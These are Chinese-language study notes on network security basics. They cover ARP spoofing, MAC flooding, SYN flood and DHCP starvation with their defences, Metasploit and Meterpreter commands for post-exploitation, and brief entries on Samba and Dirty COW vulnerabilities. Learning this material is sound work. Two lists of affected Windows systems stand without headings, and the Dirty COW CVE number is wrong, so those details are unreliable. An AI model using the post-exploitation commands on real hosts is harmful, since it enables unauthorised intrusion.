网络安全简单记录

网络安全攻防基础

1.入侵原理

服务器向外提供很多服务（Web，Mail，Mysql，SSH等等），开启服务必有开放端口来提供服务，入侵者通过可通过各种工具（fofa，whois，namp，xhydra等等）来获取服务器IP，服务器应用，应用版本等等信息，并寻找漏洞进行爆破入侵。

2.部分术语记录与回顾

POC：概念验证。验证安全漏洞是否存在，是否可利用。

EXP：漏洞利用。利用漏洞入侵攻击。

Payload：攻击载荷。拿下目标机器后，在机器上执行攻击/后门代码。

Shell：连接用户与Linux内核的应用程序。

webshell：以asp，php，jsp等网页文件存在的代码执行环境。

内网：企业内网或局域网，用于内部办公，部署业务等，外网不可访问。

DMZ：隔离区，对外服务区，如网站，论坛等，外网可直接访问。

代理（Proxy）：通过第三方（服务器、工具）进行访问，常用于身份隐藏，端口转发。

拖库攻击：入侵者将数据库拖出到自身本地服务器的过程。

洗库攻击：入侵者试图从目标数据库中删除或篡改数据的行为。

撞库攻击：入侵者使用从其他泄漏数据中获取的用户名和密码组合来尝试访问目标网站或应用程序的行为。

DOS攻击：通过消耗目标计算机系统的资源，使其无法正常对外提供服务。通常是通过向计算机发送大量的无效请求或恶意数据包，导致服务被拒绝或系统崩溃。

网络协议安全

1.ARP协议

概述：Address Resolution Protocol，地址解析协议，询问目标IP对应的MAC地址，用于在局域网（LAN）上实现主机之间的通信。

工作原理：

  • 当主机A要向主机B发送数据时，首先会检查自己的ARP缓存中是否已经有主机B的MAC地址。如果有，就直接将数据发送到主机B的MAC地址；如果没有，就进行以下步骤。
  • 主机A向局域网中所有主机发送一个ARP请求，询问目标IP地址对应的MAC地址。请求中包含了源IP地址和MAC地址，以及目标IP地址，并使用广播方式发送，局域网上的所有主机都会收到该报文。
  • 当主机B收到ARP请求报文后，会检查该报文中的目标IP地址是否与自己的IP地址匹配。如果匹配，就将自己的MAC地址作为ARP响应返回给主机A；如果不匹配，则忽略。
  • 主机A收到ARP响应后，会将主机B的IP地址和MAC地址存储到自己的ARP缓存中，并使用该MAC地址发送数据包到主机B。

1.1 ARP欺骗

原理：

  • ARP缓存的缺陷：主机不会验证自己是否给对方发过ARP请求，有新的对应关系就替换掉旧的对应关系。
  • 攻击者发送虚假的ARP响应给目标主机，欺骗目标主机将攻击者的MAC地址存储到ARP缓存表中，从而导致目标主机发送数据包时将数据包发送到攻击者的主机。

例子：

  • 一个局域网，有三台主机A、B、C。主机A想要与主机C通信，但它不知道主机C的MAC地址。于是主机A向整个局域网发送ARP请求，请求对应IP地址的MAC地址。主机C收到ARP请求后，向主机A发送ARP响应，包含自己的MAC地址。
  • 攻击者在这个局域网中也存在，攻击者发送一个虚假的ARP响应，将自己的MAC地址伪装成主机C的MAC地址，并将ARP响应发送给主机A。由于ARP协议不提供任何安全措施，主机A会将攻击者的MAC地址存储到ARP缓存表中（原存储的主机C的MAC地址被替换），从而导致主机A将通信数据包发送到攻击者的计算机上。
主机欺骗

主机A和主机B都需要与服务器通信。攻击者控制着另外一台计算机，想要窃取主机A和主机B发送给服务器的数据。攻击者可以进行ARP主机欺骗攻击：

  • 攻击者发送一个虚假的ARP响应报文给主机A，欺骗主机A认为攻击者的MAC地址是服务器的MAC地址。
  • 主机A收到虚假的ARP响应报文后，将攻击者的MAC地址存储在ARP缓存表中，并发送数据包给攻击者的计算机，而不是真正的服务器。
  • 攻击者截获主机A发送的数据包，并篡改数据，然后再将修改后的数据包发送给服务器，从而窃取数据。

防护: 使用静态ARP表（但更改较麻烦）

网关欺骗

攻击者会发送虚假的ARP响应，欺骗网络中其他设备，使它们将攻击者的MAC地址误认为是网关的MAC地址，从而导致网络流量经过攻击者的计算机，攻击者可以对流量进行窃听、篡改。

  • 攻击者发送一个虚假的ARP响应报文给局域网中的所有计算机，欺骗它们认为攻击者的计算机的MAC地址是网关设备的MAC地址。
  • 其他计算机接收到虚假的ARP响应报文后，将攻击者的计算机作为网关设备，并将所有的数据包发送到攻击者的计算机上。
  • 攻击者的计算机截取所有发送到网关的数据包，可篡改其中的数据或者进行其他的攻击。

防护： 在网关绑定主机 MAC 与 IP

1.2 交换机转发

交换机用于连接多台计算机、服务器和其他网络设备，在局域网中实现数据包的转发、筛选和分发。

交换机转发数据包：

  • 接收数据包：交换机会接收到来自计算机或其他设备的数据包。
  • 判断MAC地址：交换机检查数据包中的目标MAC地址，并查找自己的MAC地址表（也叫转发表或CAM表）以确定下一步转发的端口。
  • 转发数据包：交换机会将数据包转发到目标MAC地址所对应的端口。如果目标MAC地址不在地址表中，就会将数据包转发到所有端口（广播）。
  • 更新MAC地址表：将数据包源MAC地址和端口信息添加到MAC地址表，以便下一次转发更快地确定目标端口。
  • 筛选数据包：交换机可以根据各种条件（IP地址、协议类型等）对数据包进行筛选和分发。

1.3 MAC泛洪攻击

向交换机发送大量的虚假MAC地址，从而使交换机的MAC地址表溢出，导致交换机将数据包广播到所有端口上，从而使攻击者能够窃听其他设备之间的通信内容。

防护：

  • 使用交换机上的端口安全功能，限制单个端口上允许连接的MAC地址数量。
  • 使用交换机上的MAC地址静态绑定功能，限制MAC地址与端口的绑定关系。
  • 限制交换机上允许进入的最大MAC地址数量。

2.TCP协议

概述：Transmission Control Protocol，传输控制协议，提供可靠的数据传输服务。

2.1 三次握手

传输前需通过三次握手建立连接（以下只是概述）：

  • 第一次握手：主机A向主机B发送一个带有SYN标志的数据包，表示请求建立连接。
  • 第二次握手：主机B收到主机A发送的SYN数据包后，回应一个带有SYN和ACK标志的数据包给主机A，表示确认请求建立连接，并且请求建立连接的另一方也可以进行确认。
  • 第三次握手：主机A收到主机B发送的ACK数据包后，再次回应一个带有ACK标志的数据包给主机B，表示连接已经建立成功。

2.2 SYN Flood攻击

一种典型的DDOS攻击。

原理：利用TCP协议中的三次握手过程，攻击者发送大量的伪造的SYN数据包给目标主机，并且在回应ACK数据包之前关闭连接。使目标主机在等待ACK数据包的同时会消耗大量的资源，从而使得正常的TCP连接请求无法被处理。SYN数据包数量超过目标主机处理能力时，目标主机就会被迫停止服务，从而导致服务不可用。

防护：

  • 监视并释放无效链接，不停监视系统的半开来连接与不活动连接，达到一定阈值时拆除链接。
  • 延缓 TCB 分配方法：Syn Cache技术， Syn Cookie技术
  • SYN Proxy防火墙：对 SYN 请求进行验证
  • TCP Safe Reset技术

3.DHCP协议

概述：为计算机网络中的设备分配IP地址和其他网络配置信息的动态主机配置协议。

工作原理：

  • 发现（Discover）：当设备连接到网络时，它会发送一个DHCP发现消息，请求分配一个IP地址和其他网络配置信息。这个消息被广播到网络上的所有DHCP服务器。
  • 提供（Offer）：DHCP服务器收到DHCP发现消息后，向设备发送一个DHCP提供消息，包含一个可用的IP地址和其他配置信息。这个消息也是广播到网络上的所有设备。
  • 请求（Request）：设备收到DHCP提供消息后，会向DHCP服务器发送一个DHCP请求消息，请求分配该IP地址和其他配置信息。该请求消息只会发送给DHCP服务器，而不是广播到整个网络。
  • 确认（Acknowledge）：DHCP服务器收到DHCP请求消息后，会向设备发送一个DHCP确认消息，确认分配了该IP地址和其他配置信息。此时，设备已经成功获取到了IP地址和其他网络配置信息。
  • 更新（Renewal）：设备在使用IP地址时，会周期性地向DHCP服务器发送DHCP请求消息，请求更新租约。如果租约即将到期，DHCP服务器会向设备发送DHCP提供消息，要求续约租约。
  • 释放（Release）：当设备不再需要IP地址时，它可以向DHCP服务器发送DHCP释放消息，释放该IP地址和其他配置信息。

DHCP地址耗尽攻击:

使用一些工具和技术来模拟大量的设备，向DHCP服务器发送大量的DHCP请求消息，消耗DHCP服务器上可用的IP地址，从而使其无法为其他设备提供IP地址和其他网络配置信息。

生活实例：当我们开启手机热点时，可限制最大连接数，当连接数满时，其他设备就连接不进来。

防护：Port Security，限制MAC地址数量，设置端口上允许连接的MAC地址数量

操作系统安全

1.Metasploit

基本模块：

  • Auxiliary（辅助模块）：包含扫描，fuzz测试，拒绝服务攻击，网络协议欺骗等程序。
  • Exploits（攻击模块）：一段程序，运行时会利用目标的安全漏洞进行安全测试。
  • Payload（攻击载荷模块）：用于执行恶意操作，如获取目标主机的 shell 或远程访问权限。
  • Post（后渗透模块）：拿到权限后，进一步对目标和内外渗透。
  • Encodes（编码模块）：用于编码和混淆payload，以绕过防病毒软件和安全策略。

基本使用命令：

  • help：显示Metasploit命令的帮助文档和说明。
  • search：搜索可用的exploit、payload、auxiliary和post模块。
  • use：选择要使用的exploit、payload、auxiliary或post模块。
  • show options：显示已选择模块的选项和参数。
  • set：设置已选择模块的选项和参数。
  • back：退出当前模块。
  • exploit（或run）：运行已选择的exploit或payload模块。
  • sessions：显示当前已建立的会话列表。
  • sessions -i：连接到指定会话编号的主机或会话。
  • background：将当前会话放入后台，返回到Metasploit控制台。
  • exit（或quit）：退出Metasploit控制台。

Meterpreter：

基本命令介绍：

  • help：显示Meterpreter可用的所有命令列表。
  • sysinfo：显示目标系统的操作系统版本、硬件信息等系统信息。
  • getuid：显示当前Meterpreter会话的用户ID。
  • ps：显示目标系统上运行的所有进程列表。
  • ifconfig：列出渗透主机的网络接口。
  • kill：杀死指定进程。如：kill 。
  • shell：创建一个交互式Shell，可以在目标系统上执行命令和操作。
  • upload：上传本地文件到目标系统。如：upload /path/to/local/file /path/to/remote/file。
  • download：从目标系统下载文件到本地系统。如：download /path/to/remote/file /path/to/local/file。
  • execute：在目标系统上执行指定的命令。如：execute -f /path/to/command。
  • migrate：将Meterpreter进程转移到目标系统上的另一个进程中，以免被杀死或检测到。

影响系统：

  • Windows Vista
  • Windows Server 2008
  • Windows 7
  • Windows Server 2008 R2
  • Windows 8.1
  • Windows Server 2012 R2

影响系统：

  • Windows 7
  • Windows Server 2008 R2
  • Windows Server 2008
  • Windows XP

3.Linux漏洞

3.1 CVE-2017-7494

一种影响Samba服务器的漏洞（Samba是一个开源软件套件，允许非Windows操作系统与Windows网络共享文件和打印机）。

漏洞影响Samba 3.5.0至4.6.4版本，利用的端口是TCP端口445。

3.2 CVE-2016-5196（脏牛Dirty COW）

攻击者可以利用此漏洞在未经授权的情况下提权，并在受影响的系统上执行任意代码。

该漏洞影响Linux内核版本2.6.22至4.8之间的系统。
